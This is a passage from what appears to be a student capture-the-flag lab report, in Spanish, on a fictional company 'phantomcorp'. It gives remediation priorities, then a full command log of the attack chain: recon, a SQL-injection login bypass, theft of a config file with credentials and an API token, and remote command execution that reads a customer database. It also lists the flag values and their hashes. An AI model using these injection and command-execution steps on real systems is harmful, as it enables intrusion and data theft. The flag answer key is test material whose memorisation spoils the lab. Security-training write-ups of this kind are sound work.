No obstante, desde una perspectiva de arquitectura defensiva, la presencia de un endpoint de ejecución de comandos directos (`os.popen(cmd)`) constituye una negligencia de diseño inaceptable, ya que cualquier compromiso eventual o fuga accidental de credenciales convertía al servidor en un activo inmediatamente capturable.

### 5.3 Hoja de ruta y plan de remediación priorizado

| Prioridad / Plazo | Medida de remediación | Hallazgos mitigados |
|---|---|:---:|
| **Inmediato (0 - 24 horas)** | 1. Revocar y rotar de inmediato el token `phantom-api-7c1e`.<br>2. Desactivar temporalmente o restringir el endpoint `/api/reporte`.<br>3. Mover `/backup/rrhh.conf` fuera del Document Root y bloquear extensiones `.conf`.<br>4. Implementar Prepared Statements (`?`, `?`) en el login de RRHH. | H-01<br>H-02<br>H-03 |
| **Corto plazo (1 - 2 semanas)** | 1. Reconfigurar el contenedor Docker para que el proceso web corra bajo usuario no privilegiado (`www-data`).<br>2. Proteger la carpeta `/app/priv/` con permisos estrictos de lectura y cifrado en reposo.<br>3. Eliminar referencias sensibles en `robots.txt` y sanitizar comentarios HTML en compilación/despliegue. | H-01<br>H-04 |
| **Mediano plazo (1 - 3 meses)** | 1. Implementar un Web Application Firewall (WAF) con reglas OWASP Core Rule Set (CRS).<br>2. Integrar análisis estático y dinámico de seguridad (SAST/DAST) en los pipelines de CI/CD.<br>3. Adoptar una solución centralizada de gestión de secretos (ej. HashiCorp Vault). | Todos |

---

<!-- ========================================================================= -->
<!-- SECCIÓN 6: ANEXO Y STATUS DEL CTF (Redactado por Gonzalo Rodriguez)       -->
<!-- ========================================================================= -->
## 6. Anexo

### 6.1 Bitácora pericial cronológica de comandos
A continuación se transcribe la secuencia completa de comandos ejecutados en la consola de auditoría para reproducir el compromiso de punta a punta:

```bash
# =============================================================================
# HITO R1: Reconocimiento y enumeración de superficie
# =============================================================================
curl -s http://phantomcorp/robots.txt
# Salida: User-agent: * \n Disallow: /portal-rrhh

curl -s http://phantomcorp/portal-rrhh | grep "<!--"
# Salida: <!-- recon: portal interno localizado. FLAG{final_recon_portal} -->

./ctf submit final R1 'FLAG{final_recon_portal}'

# =============================================================================
# HITO R2: Foothold inicial mediante Inyección SQL en login
# =============================================================================
curl -s -X POST http://phantomcorp/portal-rrhh/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "user=' OR 1=1--&pass=dummy"
# Salida: Bienvenido admin. Dashboard RRHH. \n FLAG{final_sqli_foothold}
#         Backup de config disponible en: /backup/rrhh.conf

./ctf submit final R2 'FLAG{final_sqli_foothold}'

# =============================================================================
# HITO R3: Post-explotación y descarga de secretos
# =============================================================================
curl -s http://phantomcorp/backup/rrhh.conf
# Salida: DB_USER=rrhh_app \n DB_PASS=Rh-2026 \n API_TOKEN=phantom-api-7c1e
#         # usar el token en /api/reporte?token=...&cmd=... FLAG{final_token_looted}

./ctf submit final R3 'FLAG{final_token_looted}'

# =============================================================================
# HITO R4: Ejecución remota de comandos (RCE) y exfiltración de Crown Jewels
# =============================================================================
# Verificación de identidad y contexto
curl -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id"
# Salida: $ id \n uid=0(root) gid=0(root) groups=0(root)

# Exfiltración de clientes corporativos y captura de bandera
curl -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=cat+/app/priv/clientes.db.txt"
# Salida: $ cat /app/priv/clientes.db.txt
#         clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}

./ctf submit final R4 'FLAG{final_crown_jewels}'

# =============================================================================
# Verificación final de estado del engagement
# =============================================================================
./ctf status final
```

### 6.2 Matriz de validación criptográfica de banderas (SHA-256)
Conforme a las exigencias periciales de trazabilidad e integridad del laboratorio, se documenta la correspondencia criptográfica exacta entre los valores de las banderas capturadas y los hashes calculados por el motor de evaluación (`retos.manifest`):

| Hito | Reto técnico | Bandera capturada en texto plano | Hash SHA-256 calculado | Hash esperado (`retos.manifest`) | Estado |
|:---:|---|---|---|---|:---:|
| **R1** | Recon/enum: portal interno localizado | `FLAG{final_recon_portal}` | `71369b0044f9f3cf902058a367a83c5f39dd4897208831a82002297f4e8142cb` | `71369b0044f9f3cf902058a367a83c5f39dd4897208831a82002297f4e8142cb` | **VÁLIDO** |
| **R2** | Explotación: foothold por SQLi | `FLAG{final_sqli_foothold}` | `812d30f0d147908025ddffded3ebadc81769be1b6faf5b8dbf759ba8c7d16f5d` | `812d30f0d147908025ddffded3ebadc81769be1b6faf5b8dbf759ba8c7d16f5d` | **VÁLIDO** |
| **R3** | Post: token de API looteado | `FLAG{final_token_looted}` | `66a434f816e74d489f75a6636e627df3be31fade79acd8e7f9bf5a4205f6b4f8` | `66a434f816e74d489f75a6636e627df3be31fade79acd8e7f9bf5a4205f6b4f8` | **VÁLIDO** |
| **R4** | Impacto: crown jewels (datos clientes) | `FLAG{final_crown_jewels}` | `511226fbc003a0eaeb9e023f4de80d6109023691ed2a88b96ad1a10f9028ffab` | `511226fbc003a0eaeb9e023f4de80d6109023691ed2a88b96ad1a10f9028ffab` | **VÁLIDO** |

### 6.3 Salida pericial de validación del motor CTF (`./ctf status final`)
A continuación se incorpora la captura de texto pericial generada por el entorno evaluador en `loot/ctf_status.txt`, confirmando el 100% de los hitos resueltos para el Grupo 12:

```text
  ╭────────────────────────────────────────────────────────────╮
  │                   PROGRESO · LAB final                    │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Recon/enum: portal interno localizado
   ✓  R2     Explotacion: foothold por SQLi
   ✓  R3     Post: token de API looteado
   ✓  R4     Impacto: crown jewels (datos de clientes)

  ██████████████████████████████  4/4 (100%)

[ OK ] ¡Lab final COMPLETO! Ponete las pilas con la próxima unidad.
```

